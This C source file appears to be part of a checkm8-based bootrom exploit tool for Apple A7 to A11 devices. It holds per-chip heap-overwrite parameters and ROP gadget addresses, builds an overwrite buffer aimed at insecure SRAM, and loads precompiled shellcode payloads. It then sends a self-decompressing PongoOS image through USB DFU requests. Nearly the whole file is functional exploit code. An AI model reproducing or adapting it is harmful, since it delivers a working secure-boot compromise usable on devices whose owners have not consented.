#include "payload.h"

#include <stdlib.h>
#include <stdint.h>

#include "../utils/log.h"
#include "dfu.h"
#include "../gen/payloads/yolo_t8015.h"
#include "../gen/payloads/yolo_t8011.h"
#include "../gen/payloads/yolo_t8010.h"
#include "../gen/payloads/yolo_s8003.h"
#include "../gen/payloads/yolo_s8001.h"
#include "../gen/payloads/yolo_s8000.h"
#include "../gen/payloads/yolo_t7001.h"
#include "../gen/payloads/yolo_t7000.h"

bool checkm8_find_device_configuration_for_cpid(int cpid, struct DeviceConfiguration *config) {
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
        case 0x8012:
        case 0x8011:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x540;
            config->hole = 6;
            break;
        case 0x8010:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x5C0;
            config->hole = 5;
            break;
        case 0x8001:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x5C0;
            config->hole = 6;
            break;
        case 0x8003:
        case 0x8000:
        case 0x7001:
        case 0x7000:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x500;
            config->hole = 0;
            break;
        default:
            LOG("CPID 0x%x is not supported!", cpid);
            if (cpid > 0x8015) {
                LOG("arm64e devices (A12 and newer) will never be supported.");
            }

            foundMatchingConfiguration = false;
            break;
    }
    return foundMatchingConfiguration;
}

bool checkm8_find_payload_configuration_for_cpid(int cpid, struct PayloadConfiguration *config) {
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
            config->tlbi = 0x1000004AC;
            config->nopGadget = 0x10000A9C4;
            config->retGadget = 0x100000148;
            config->patchAddress = 0x10000624C;
            config->ttbr0Address = 0x18000C000;
			config->functionGadget = 0x10000A9AC;
			config->ttbr0Write = 0x10000045C;
			config->memcpyAddress = 0x10000E9D0;
			config->aesCryptoCommand = 0x100009E9C;
			config->bootTrampolineEnd = 0x18001C000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180003A78;
			config->dfu_handle_request_address = 0x180008638;
			config->usb_core_do_transfer = 0x10000B9A8;
			config->dfu_handle_bus_reset_address = 0x180008668;
			config->insecureMemoryBase = 0x18001C000;
			config->handle_interface_request = 0x10000BCCC;
			config->usb_create_string_descriptor = 0x10000AE80;
			config->usb_serial_number_string_descriptor = 0x1800008FA;
            break;
        case 0x8012:
            config->tlbi = 0x100000494;
            config->nopGadget = 0x100008DB8;
            config->retGadget = 0x10000012C;
            config->patchAddress = 0x100004854;
            config->ttbr0Address = 0x18000C000;
			config->functionGadget = 0x100008DA0;
			config->ttbr0Write = 0x100000444;
			config->memcpyAddress = 0x10000EA30;
			config->aesCryptoCommand = 0x1000082AC;
			config->bootTrampolineEnd = 0x18001C000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180003AF8;
			config->dfu_handle_request_address = 0x180008B08;
			config->usb_core_do_transfer = 0x10000BD20;
			config->dfu_handle_bus_reset_address = 0x180008B38;
			config->insecureMemoryBase = 0x18001C000;
			config->handle_interface_request = 0x10000BFFC;
			config->usb_create_string_descriptor = 0x10000B1CC;
			config->usb_serial_number_string_descriptor = 0x18000082A;
            break;
        case 0x8011:
            config->tlbi = 0x100000444;
            config->nopGadget = 0x10000CD0C;
            config->retGadget = 0x100000148;
            config->patchAddress = 0x100007630;
            config->ttbr0Address = 0x1800A0000;
			config->functionGadget = 0x10000CCEC;
			config->ttbr0Write = 0x1000003F4;
			config->memcpyAddress = 0x100010950;
			config->aesCryptoCommand = 0x10000C994;
			config->bootTrampolineEnd = 0x1800B0000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180083D28;
			config->dfu_handle_request_address = 0x180088A58;
			config->usb_core_do_transfer = 0x10000DD64;
			config->dfu_handle_bus_reset_address = 0x180088A88;
			config->insecureMemoryBase = 0x1800B0000;
			config->handle_interface_request = 0x10000E08C;
			config->usb_create_string_descriptor = 0x10000D234;
			config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        case 0x8010:
            config->tlbi = 0x100000434;
            config->nopGadget = 0x10000CC6C;
            config->retGadget = 0x10000015C;
            config->patchAddress = 0x1000074AC;
            config->ttbr0Address = 0x1800A0000;
			config->functionGadget = 0x10000CC4C;
			config->ttbr0Write = 0x1000003E4;
			config->memcpyAddress = 0x100010730;
			config->aesCryptoCommand = 0x10000C8F4;
			config->bootTrampolineEnd = 0x1800B0000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180083CF8;
			config->dfu_handle_request_address = 0x180088B48;
			config->usb_core_do_transfer = 0x10000DC98;
			config->dfu_handle_bus_reset_address = 0x180088B78;
			config->insecureMemoryBase = 0x1800B0000;
			config->handle_interface_request = 0x10000DFB8;
			config->usb_create_string_descriptor = 0x10000D150;
			config->usb_serial_number_string_descriptor = 0x1800805DA;
            break;
        case 0x8001:
            config->tlbi = 0x100000404;
            config->nopGadget = 0x10000CD60;
            config->retGadget = 0x100000118;
            config->patchAddress = 0x100007668;
            config->ttbr0Address = 0x180050000;
			config->functionGadget = 0x10000CD40;
			config->ttbr0Write = 0x1000003B4;
			config->memcpyAddress = 0x1000106F0;
			config->aesCryptoCommand = 0x10000C9D4;
			config->bootTrampolineEnd = 0x180044000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180047578;
			config->dfu_handle_request_address = 0x18004C378;
			config->usb_core_do_transfer = 0x10000DDA4;
			config->dfu_handle_bus_reset_address = 0x18004C3A8;
			config->insecureMemoryBase = 0x180000000;
			config->handle_interface_request = 0x10000E0B4;
			config->usb_create_string_descriptor = 0x10000D280;
			config->usb_serial_number_string_descriptor = 0x18004486A;
            break;
        case 0x8003:
        case 0x8000:
            config->patchAddress = 0x10000812C;
            config->ttbr0Address = 0x1800C8000;
			config->memcpyAddress = 0x100011030;
			config->aesCryptoCommand = 0x10000DAA0;
			config->bootTrampolineEnd = 0x1800E1000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180087958;
			config->dfu_handle_request_address = 0x1800878F8;
			config->usb_core_do_transfer = 0x10000EE78;
			config->dfu_handle_bus_reset_address = 0x180087928;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x10000F1B0;
			config->usb_create_string_descriptor = 0x10000E354;
			config->usb_serial_number_string_descriptor = 0x1800807DA;
            break;
        case 0x7001:
            config->patchAddress = 0x10000AD04;
			config->memcpyAddress = 0x100013F10;
			config->aesCryptoCommand = 0x100010A90;
			config->bootTrampolineEnd = 0x1800E1000;
			config->gUSBSerialNumber = 0x180088E48;
			config->dfu_handle_request_address = 0x180088DF8;
			config->usb_core_do_transfer = 0x100011BB4;
			config->dfu_handle_bus_reset_address = 0x180088E18;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x100011EE4;
			config->usb_create_string_descriptor = 0x100011074;
			config->usb_serial_number_string_descriptor = 0x180080C2A;
            break;
        case 0x7000:
            config->patchAddress = 0x100007E98;
			config->memcpyAddress = 0x100010E70;
			config->aesCryptoCommand = 0x10000DA90;
			config->bootTrampolineEnd = 0x1800E1000;
			config->gUSBSerialNumber = 0x1800888C8;
			config->dfu_handle_request_address = 0x180088878;
			config->usb_core_do_transfer = 0x10000EBB4;
			config->dfu_handle_bus_reset_address = 0x180088898;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x10000EEE4;
			config->usb_create_string_descriptor = 0x10000E074;
			config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        default:
            LOG("CPID 0x%x is not supported!", cpid);
            foundMatchingConfiguration = false;
    }
    return foundMatchingConfiguration;
}

uint8_t *create_pongo_overwrite_for_device(struct PayloadConfiguration *payloadConfig, size_t *overwriteSize) {
    LOG("Preparing overwrite for YoloDFU mode.");

    uint64_t *overwrite = malloc(0x30);

    LOG("overwrite buffer: %p", (void *)overwrite);
    LOG("insecureMemoryBase: 0x%016llx",
        (unsigned long long)payloadConfig->insecureMemoryBase);

    overwrite[5] = payloadConfig->insecureMemoryBase;

    LOG("overwrite[5]: 0x%016llx",
        (unsigned long long)overwrite[5]);

    *overwriteSize = 0x30;

    LOG("overwriteSize: 0x%zx (%zu)",
        *overwriteSize, *overwriteSize);

    return (uint8_t *)overwrite;
}

uint8_t *create_pongo_payload_for_device(struct DeviceConfiguration *deviceConfig, size_t *payloadSize) {
    LOG("Preparing YoloDFU payload for CPID 0x%x.", deviceConfig->cpid);
    switch (deviceConfig->cpid) {
        case 0x8015:
            *payloadSize = payloads_yolo_t8015_bin_len;
            return (uint8_t *)payloads_yolo_t8015_bin;
        case 0x8011:
            *payloadSize = payloads_yolo_t8011_bin_len;
            return (uint8_t *)payloads_yolo_t8011_bin;
        case 0x8010:
            *payloadSize = payloads_yolo_t8010_bin_len;
            return (uint8_t *)payloads_yolo_t8010_bin;
        case 0x8003:
            *payloadSize = payloads_yolo_s8003_bin_len;
            return (uint8_t *)payloads_yolo_s8003_bin;
        case 0x8001:
            *payloadSize = payloads_yolo_s8001_bin_len;
            return (uint8_t *)payloads_yolo_s8001_bin;
        case 0x8000:
            *payloadSize = payloads_yolo_s8000_bin_len;
            return (uint8_t *)payloads_yolo_s8000_bin;
        case 0x7001:
            *payloadSize = payloads_yolo_t7001_bin_len;
            return (uint8_t *)payloads_yolo_t7001_bin;
        case 0x7000:
            *payloadSize = payloads_yolo_t7000_bin_len;
            return (uint8_t *)payloads_yolo_t7000_bin;
        default:
            LOG("Failed to prepare payload for device with CPID 0x%x.", deviceConfig->cpid);
            return NULL;
    }
}

// TODO: move l8r

bool wait_for_device_to_enter_yolo_dfu(usb_handle_t *handle) {
    char *serialNumber = NULL;
    wait_usb_handle(handle);
    serialNumber = get_usb_device_serial_number(handle);
    if (serialNumber == NULL) {
        LOG("Failed to get device serial number.");
        close_usb_handle(handle);
        return false;
    }
    unsigned totalTime = 0;
    while (!dfu_serial_number_is_in_yolo_dfu(serialNumber)) {
        wait_usb_handle(handle);
        free(serialNumber);
        serialNumber = get_usb_device_serial_number(handle);
        close_usb_handle(handle);
        if (serialNumber == NULL) {
            LOG("Failed to get device serial number.");
            return false;
        }
        sleep_ms(100);
        totalTime += 100;
        if (totalTime >= 15000) {
            LOG("Device failed to enter Yolo DFU mode.");
            return false;
        }
    }
    close_usb_handle(handle);
    return true;
}

#include <string.h>
#include "../gen/payloads/Pongo.h"
#include "../gen/payloads/lz4dec.h"
#include <lz4hc.h>

bool prepare_pongo(unsigned char **pongoBuf, size_t *size)
{
    size_t shellcodeSize, pongoSize;
    void *shellcode, *pongo;

    // The shellcode that is appended to the beginning of the
    // LZ4-compressed Pongo is actually an LZ4 decompressor
    // that decompresses the Pongo image into memory.
    // It is, in effect, a self-extracting payload.

    shellcodeSize = payloads_lz4dec_bin_len;
    shellcode = malloc(shellcodeSize);
    memcpy(shellcode, payloads_lz4dec_bin, shellcodeSize);

    pongoSize = payloads_Pongo_bin_len;
    pongo = malloc(pongoSize);
    memcpy(pongo, payloads_Pongo_bin, pongoSize);

    // Compress PongoOS
    char *pongoCompressed = malloc(pongoSize);
    LOG("Compressing PongoOS");
    pongoSize = LZ4_compress_HC(pongo, pongoCompressed, pongoSize, pongoSize, LZ4HC_CLEVEL_MAX);
    if (pongoSize == 0) {
        LOG("Failed to compress PongoOS");
        return false;
    }

    // Add shellcode to PongoOS
    LOG("Adding shellcode to PongoOS");
    void *tmp = malloc(pongoSize + shellcodeSize);
    memcpy(tmp, shellcode, shellcodeSize);
    memcpy(tmp + shellcodeSize, pongoCompressed, pongoSize);
    free(pongo);
    pongo = tmp;
    pongoSize += shellcodeSize;
    free(shellcode);

    // Write size of compressed Pongo into data for decompressor
    uint32_t *pongoSizeInData = (uint32_t *)(pongo + 0x1fc);
    *pongoSizeInData = pongoSize - shellcodeSize;

    // Update parameters
    *pongoBuf = pongo;
    *size = pongoSize;

    return true;
}

bool send_pongo_to_yolo_dfu(usb_handle_t *handle) {
    unsigned char *pongoData = NULL;
    size_t pongoSize = 0;
    if (!prepare_pongo(&pongoData, &pongoSize) || pongoData == NULL || pongoSize == 0) {
        LOG("Failed to prepare PongoOS.");
        return false;
    }
    bool ret = false;
    if (wait_usb_handle(handle)) {
        if (dfu_serial_number_is_in_yolo_dfu(get_usb_device_serial_number(handle))) {
            size_t lengthSent = 0, size;
            transfer_ret_t transferRet;
            while (lengthSent < pongoSize) {
                retry:
                    size = ((pongoSize - lengthSent) > 0x800) ? 0x800 : (pongoSize - lengthSent);
                    send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, pongoData + lengthSent, size, &transferRet);
                    if (transferRet.sz != size || transferRet.ret != USB_TRANSFER_OK) {
                        LOG("Retrying at size 0x%lx...", size);
                        sleep_ms(100);
                        goto retry;
                    }
                    lengthSent += size;
            }
            send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
            close_usb_handle(handle);
            sleep_ms(100);
            init_usb_handle(handle, 0x5AC, 0x4141);
            wait_usb_handle(handle);
            free(pongoData);
            LOG("Device is now in PongoOS!");
            ret = true;
        }
        else {
            free(pongoData);
            LOG("Device is not in Yolo DFU mode!");
        }
    }
    return ret;
}
